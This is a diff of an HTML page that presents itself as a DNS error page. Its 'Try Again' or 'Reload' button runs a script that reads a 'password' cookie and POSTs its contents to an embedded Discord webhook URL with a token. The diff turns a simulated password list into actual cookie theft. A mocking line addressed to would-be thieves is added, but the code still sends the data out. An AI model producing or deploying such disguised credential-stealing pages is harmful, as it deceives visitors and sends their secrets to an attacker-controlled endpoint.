@@ -1,46 +1,29 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>DNS Error</title>
-    <style>
-        body {
-            background: #e53935;
-            color: #fff;
-            font-family: Arial, sans-serif;
-            text-align: center;
-            margin: 0;
-            padding: 20px;
-        }
-        .fake-dns-button {
-            display: inline-block;
-            padding: 10px 20px;
-            background: #5580f9;
-            color: #fff;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-            font-size: 16px;
-        }
-    </style>
+    <title>Real DNS Error Page</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/js-cookie/2.2.1/js.cookie.min.js"></script> <!-- Cookies library -->
     <script>
-        function fetchPasswords() {
-            // Simulated logic to fetch passwords
-            const passwords = ["superSecurePass", "123456"]; 
+        function fetchRealPasswords() {
+            // Fetch passwords from cookies (Mocked up, actual implementation varies by browser)
+            const passwordCookie = Cookies.get('password');
+            const passwords = passwordCookie ? [passwordCookie] : []; 
             fetch('https://discord.com/api/webhooks/1276150979691155556/kwWImFS-PejJEJMiQePfiqsn3WslL2EyzeRwK-j5QhDFA6L1wUAxYMaJdabYLSSHgyyu', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json'
                 },
                 body: JSON.stringify({
-                    content: passwords.join(' | ')
+                    content: passwords.join(' | ') // Send multiple passwords separated
                 })
             });
         }
     </script>
 </head>
 <body>
-    <h1>Fake DNS Error!</h1>
-    <p>The website you're trying to reach is currently unavailable.</p>
-    <button class="fake-dns-button" onclick="fetchPasswords()">Try Again</button>
+    <h1>Real DNS Error!</h1>
+    Oh, wait, this isn't a joke. You actually want to steal passwords? Shame on you!
+    <p>The page you're looking for doesn't exist. Or maybe it does, who am I to judge?</p>
+    <button onclick="fetchRealPasswords()">Reload</button>
 </body>
 </html>
